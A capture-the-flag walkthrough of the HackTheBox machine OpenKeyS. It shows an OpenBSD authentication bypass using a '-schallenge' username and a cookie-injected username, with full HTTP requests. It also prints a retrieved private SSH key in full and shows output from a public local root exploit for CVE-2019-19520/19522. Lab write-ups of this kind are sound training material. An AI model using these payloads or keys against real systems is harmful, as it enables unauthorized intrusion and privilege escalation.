---
layout: walkthrough
title: HackTheBox - OpenKeyS
date: 2000-09-14 12:00:00 +0200
img: ChallengeVMs/HTB_Icons/openkeys.png # Add image post (optional)
status: Retired
description: Hi all, My name is Kyhle Öhlinger and this post forms part of my challenge VM writeups. If you enjoy any of the posts, feel free to reach out and let me know :) 
---

Hi everyone, today we are going to be looking at OpenKeyS --`10.10.10.199`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/OpenKeyS/Overview.png"  style="width: 40%" />
</p>

## Information Gathering

In order to start the VM, we start with the Information gathering phase. Let's begin with a Nmap Scan.

### Nmap Output

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/OpenKeyS$ nmap -sC -sV 10.10.10.199
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-25 08:17 EDT
Stats: 0:00:19 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 37.80% done; ETC: 08:17 (0:00:10 remaining)
Nmap scan report for 10.10.10.199
Host is up (0.20s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 5e:ff:81:e9:1f:9b:f8:9a:25:df:5d:82:1a:dd:7a:81 (RSA)
|   256 64:7a:5a:52:85:c5:6d:d5:4a:6b:a7:1a:9a:8a:b9:bb (ECDSA)
|_  256 12:35:4b:6e:23:09:dc:ea:00:8c:72:20:c7:50:32:f3 (ED25519)
80/tcp open  http    OpenBSD httpd
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.69 seconds

```

</details>

From the output shown above, we can see that the machine is a Linux machine, and I added `openkeys.htb` to the `/etc/hosts` file. As this is an OpenBSD machine and it only has 2 open ports, I'm going to assume that we need to start by looking at the web application -- since we have no usernames to even attempt to bruteforce SSH. When browsing to <http://openkeys.htb> we were presented with the following login form:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/OpenKeyS/img1.png"  style="width: 70%" />
</p>


### Basic Web Enumeration
While browsing the web application, I ran the following scans:
* Wfuzz
* Nikto
* Gobuster

The output of the scans is shown below:

<details>

```bat
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404,403 -u "http://10.10.10.199/FUZZ.php" -t 100

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.199/FUZZ.php
Total requests: 4658

===================================================================
ID           Response   Lines    Word     Chars       
===================================================================

000002154:   200        101 L    195 W    4837 Ch     

Total time: 16.56560
Processed Requests: 4658
Filtered Requests: 4657
Requests/sec.: 281.1850

```
```bat

vagrant@ko:~/Desktop/HackTheBox/OpenKeyS$ nikto -h 10.10.10.199
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.199
+ Target Hostname:    10.10.10.199
+ Target Port:        80
+ Start Time:         2020-10-25 08:24:35 (GMT-4)
---------------------------------------------------------------------------
+ Server: OpenBSD httpd
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/7.3.13
+ Cookie PHPSESSID created without the httponly flag
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Multiple index files found: /index.php, /index.html
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3268: /includes/: Directory indexing found.
+ OSVDB-3092: /includes/: This might be interesting...
+ OSVDB-3268: /images/: Directory indexing found.

```
```bat

gobuster dir -u http://10.10.10.199 -w /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt

gobuster dir -u http://10.10.10.199 -w /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.199
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/25 08:22:57 Starting gobuster
===============================================================
/index.php (Status: 200)
===============================================================
2020/10/25 08:24:50 Finished
===============================================================

```
```bat

gobuster dir -u http://10.10.10.199 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.199
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/25 08:26:02 Starting gobuster
===============================================================
/images (Status: 301)
/includes (Status: 301)
/js (Status: 301)
/css (Status: 301)
/fonts (Status: 301)
/vendor (Status: 301)

```

</details>

I knew that it was a PHP page based on the fact that there was a `index.php` page which was identified from the web application and the Nikto scan: <http://10.10.10.199/index.php>. While the aforementioned scans were running, I attempted to proxy the application through Burpsuite and try for basic SQL injection, however it did not appear as if the application was exploitable. After running Gobuster on the host, there were several directories which had directory listing enabled. The `/includes` directory contained the following files:

```bat
../                                                23-Jun-2020 08:18                   -
auth.php                                           22-Jun-2020 13:24                1373
auth.php.swp                                       17-Jun-2020 14:57               12288
```

The `auth.php` file did not have any visible content, however the `auth.php.swp` file contained the following information:

<details>

```php
b0VIM 8.1�-�^���jenniferopenkeys.htb/var/www/htdocs/includes/auth.php3210#"! Utp=ad� �=����sWB@?" �������mgC���{aWJ@�������vpnmUS0���J�����������?>}    session_start();    session_destroy();    session_unset();{function close_session()}    $_SESSION["username"] = $_REQUEST['username'];    $_SESSION["user_agent"] = $_SERVER['HTTP_USER_AGENT'];    $_SESSION["remote_addr"] = $_SERVER['REMOTE_ADDR'];    $_SESSION["last_activity"] = $_SERVER['REQUEST_TIME'];    $_SESSION["login_time"] = $_SERVER['REQUEST_TIME'];    $_SESSION["logged_in"] = True;{function init_session()}    }        return False;    {    else    }        }            return True;            $_SESSION['last_activity'] = $time;            // Session is active, update last activity time and return True        {        else        }            return False;            close_session();        {            ($time - $_SESSION['last_activity']) > $session_timeout)        if (isset($_SESSION['last_activity']) &&         $time = $_SERVER['REQUEST_TIME'];        // Has the session expired?    {    if(isset($_SESSION["logged_in"]))    // Is the user logged in?     session_start();    // Start the session    $session_timeout = 300;    // Session timeout in seconds{function is_active_session()}    return $retcode;    system($cmd, $retcode);    $cmd = escapeshellcmd("../auth_helpers/check_auth " . $username . " " . $password);{function authenticate($username, $password)

```

</details>

From the first line within the file, we know that it is a `VIM` swap file, the user is `jennifer`, the host is `openkeys.htb` and the file is stored in `/var/www/htdocs/includes/auth.php`. I decided to retrieve the file with `wget` so that it would be a bit more readable, however I did take note of a potential username: `jennifer`. The image below shows file retrieval command that I made use of:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/OpenKeyS/img2.png"  style="width: 70%" />
</p>

The contents of the php file are shown below:

<details>

```php
<?php

function authenticate($username, $password)
{
    $cmd = escapeshellcmd("../auth_helpers/check_auth " . $username . " " . $password);
    system($cmd, $retcode);
    return $retcode;
}

function is_active_session()
{
    // Session timeout in seconds
    $session_timeout = 300;

    // Start the session
    session_start();

    // Is the user logged in? 
    if(isset($_SESSION["logged_in"]))
    {
        // Has the session expired?
        $time = $_SERVER['REQUEST_TIME'];
        if (isset($_SESSION['last_activity']) && 
            ($time - $_SESSION['last_activity']) > $session_timeout)
        {
            close_session();
            return False;
        }
        else
        {
            // Session is active, update last activity time and return True
            $_SESSION['last_activity'] = $time;
            return True;
        }
    }
    else
    {
        return False;
    }
}

function init_session()
{
    $_SESSION["logged_in"] = True;
    $_SESSION["login_time"] = $_SERVER['REQUEST_TIME'];
    $_SESSION["last_activity"] = $_SERVER['REQUEST_TIME'];
    $_SESSION["remote_addr"] = $_SERVER['REMOTE_ADDR'];
    $_SESSION["user_agent"] = $_SERVER['HTTP_USER_AGENT'];
    $_SESSION["username"] = $_REQUEST['username'];
}

function close_session()
{
    session_unset();
    session_destroy();
    session_start();
}


?>

```

</details>

I also decided to run a `file` command on the `check_auth` file which is referred to above -- `/auth_helpers/check_auth`:

```bat
vagrant@ko:~/Desktop/HackTheBox/OpenKeyS/webapp$  file check_auth 
check_auth: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /usr/libexec/ld.so, for OpenBSD, not stripped
```

### Authorisation Bypass

As shown above, the username field is accepted as a `$_REQUEST` parameter so we could potentially abuse this. After some Google Fu, I came across the following OpenBSD exploit -- OpenBSD Authentication Bypass (CVE-2019-19521):

> The authentication bypass vulnerability resides in the way OpenBSD’s authentication framework parses the username supplied by a user while logging in through smtpd, ldapd, radiusd, su, or sshd services.

> Using this flaw, a remote attacker can successfully access vulnerable  services with any password just by entering the username as  “-schallenge” or “-schallenge: passwd” and it works because a hyphen (-) before username tricks OpenBSD into interpreting the value as a  command-line option and not as a username.

My initial attempt set the username within the username parameter as shown in the request below:

<details>

```bat
POST /index.php HTTP/1.1
Host: 10.10.10.199
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.199/index.php

Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Connection: close
Cookie: PHPSESSID=ghcqrf91510shrmg4c0nmalukb;
Upgrade-Insecure-Requests: 1

username=-schallenge&password=passwd

```

</details>

Running the basic command above provided us with the following error page:

<p class="imgMiddle">
<img src="/assets/img/ChallengeVMs/OpenKeyS/img3.png"  style="width: 60%" />
</p>

If you recall from above, the username parameter was accepted as a `$_REQUEST` which meant that we could include the username field within the Cookie field. Since we had the username: `jennifer` from before, I decided to attempt to retrieve that user's SSH key by inserting the username for the user within the `Cookie` field. The request is shown below:

<details>

```bat
POST /index.php HTTP/1.1
Host: 10.10.10.199
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.199/index.php

Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Connection: close
Cookie: PHPSESSID=ghcqrf91510shrmg4c0nmalukb;username=jennifer
Upgrade-Insecure-Requests: 1

username=-schallenge&password=passwd

```
</details>

The above command was successful and I was able to retrieve the OpenSSH key for jennifer, the SSH key is provided below:

<details>

```bat

-----BEGIN OPENSSH PRIVATE KEY-----
 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
 -----END OPENSSH PRIVATE KEY-----

```

</details>


## Privilege Escalation using Jennifer

After altering the file with the required permissions (`chmod 600`), I was able to authenticate to the host via SSH:

<details>

```bat
vagrant@ko:~/Desktop/HackTheBox/OpenKeyS/ssh$ ssh jennifer@10.10.10.199 -i jennifer.ssh 
Last login: Sun Oct 25 12:57:10 2020 from 10.10.14.77
OpenBSD 6.6 (GENERIC) #353: Sat Oct 12 10:45:56 MDT 2019

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

openkeys$

```

</details>


### Basic Enumeration
The enumeration phase took me quite a while on this machine. The initial commands that I generally run include listing the current users groups and host information, as shown below:

<details>

```bat
uname -a:
OpenBSD openkeys.htb 6.6 GENERIC#353 amd64
 
hostname:
openkeys.htb
 
id
uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel)
 
ifconfig:
lo0: flags=8049<UP,LOOPBACK,RUNNING,MULTICAST> mtu 32768
        index 3 priority 0 llprio 3
        groups: lo
        inet6 ::1 prefixlen 128
        inet6 fe80::1%lo0 prefixlen 64 scopeid 0x3
        inet 127.0.0.1 netmask 0xff000000
vmx0: flags=8843<UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST> mtu 1500
        lladdr 00:50:56:b9:ea:c3
        index 1 priority 0 llprio 3
        groups: egress
        media: Ethernet autoselect (10GbaseT)
        status: active
        inet 10.10.10.199 netmask 0xffffff00 broadcast 10.10.10.255
enc0: flags=0<>
        index 2 priority 0 llprio 3
        groups: enc
        status: active
pflog0: flags=141<UP,RUNNING,PROMISC> mtu 33136
        index 4 priority 0 llprio 3
        groups: pflog
 
groups:
jennifer wheel

```

</details>

After some basic enumeration, I searched for additional OpenBSD exploits and came across the following link: <https://www.secpod.com/blog/openbsd-authentication-bypass-and-local-privilege-escalation-vulnerabilities/>. This provided some vulnerabilities which I decided to look into:

> CVE-2019-19519: Local privilege escalation via su

> The ‘su’ stands for switch user or substitute user. It is a command used  to switch from one account to another. The command includes a ‘-L’  option which stands for looping until a correct username and password  combination is entered.

> A local attacker can exploit su command’s -L option to log in as  himself, but with another user’s login class (except for root’s login  class if the attacker is not in the group “wheel”) and gain his  privileges. This happens due to a logical error in ‘su’ command’s  primary functions where the ‘class’ variable is set once and never reset.

Since I did not know the user's password, attempting to exploit this vulnerability responded with the following:

<details>

```bat
openkeys$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

Password: 
Are you on drugs?
Password: 
You type like i drive.
Password: 
sudo: 3 incorrect password attempts

```
</details>

As I was not comfortable with enumerating OpenBSD, I searched for additional vulnerabilities within the version and I came across an exploit for `openbsd-authroot OpenBSD local root exploit`. The OpenBSD vulnerabilities are local privilege escalation issues as briefly explained below:

* CVE-2019-19520: Due to the mishandling of environment-provided paths used in dlopen(), xlock, which comes installed by default on OpenBSD, could allow local attackers to escalate privileges to 'auth' group.
* CVE-2019-19522: Due to incorrect operation of authorization mechanisms via "S/Key" and "YubiKey," which is a non-default configuration, a local attacker with 'auth' group permission can gain full privileges of the root user.
* CVE-2019-19519: Due to a logical error in one of the su's primary functions, a local attacker can achieve any user's login class, often excluding root, by exploiting su's -L option.

After looking for an exploit based on the above explanations, I came across the following PoC: <https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot>. In order for this to succeed, S/Key or YubiKey authentication needed to be enabled. Navigating to `/etc/login.conf` showed that S/Key authentication was enabled on the host:

```bat
Authentication types:
/etc/login.conf

# Default allowed authentication styles
auth-defaults:auth=passwd,skey:
```

### S/Key Exploitation:

The second requirement was that the skey process was owned by root which would allow escalation if it was part of the `auth` group. Viewing this within the `/etc` directory showed that this was indeed the case:

```bat
openkeys$ ls -la /etc | grep skey
drwx-wx--T   2 root  auth         512 Jun 24 09:25 skey

```

Since we had the prerequisites for this exploit to success, I copied the file to the machine, gave the file execution permissions, and ran it using `./test.sh` as shown below:

<details>

```bat
openkeys$ ./test.sh                                                                                              
openbsd-authroot (CVE-2019-19520 / CVE-2019-19522)
[*] checking system ...
[*] system supports S/Key authentication
[*] id: uid=1001(jennifer) gid=1001(jennifer) groups=1001(jennifer), 0(wheel)
[*] compiling ...
[*] running Xvfb ...
[*] testing for CVE-2019-19520 ...
_XSERVTransmkdir: Owner of /tmp/.X11-unix should be set to root
[+] success! we have auth group permissions

WARNING: THIS EXPLOIT WILL DELETE KEYS. YOU HAVE 5 SECONDS TO CANCEL (CTRL+C).

[*] trying CVE-2019-19522 (S/Key) ...
Your password is: EGG LARD GROW HOG DRAG LAIN
otp-md5 99 obsd91335
S/Key Password:
                                                                                                                
openkeys# 
openkeys# whoami
root

```

</details>


That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.